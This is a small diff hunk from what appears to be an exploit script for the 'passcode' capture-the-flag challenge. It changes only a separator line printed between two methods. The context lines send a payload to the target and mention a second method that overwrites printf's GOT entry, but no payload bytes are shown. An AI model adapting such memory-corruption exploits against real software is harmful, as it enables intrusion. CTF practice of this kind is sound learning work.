@@ -20,7 +20,7 @@ print("payload = ", payload)
 passcode.sendline(payload)
 print(passcode.recvall())
 
-print("===============================================method2============================================")
+print("===============================================method2================================================")
 
 # method2
 # overwrite printf_got
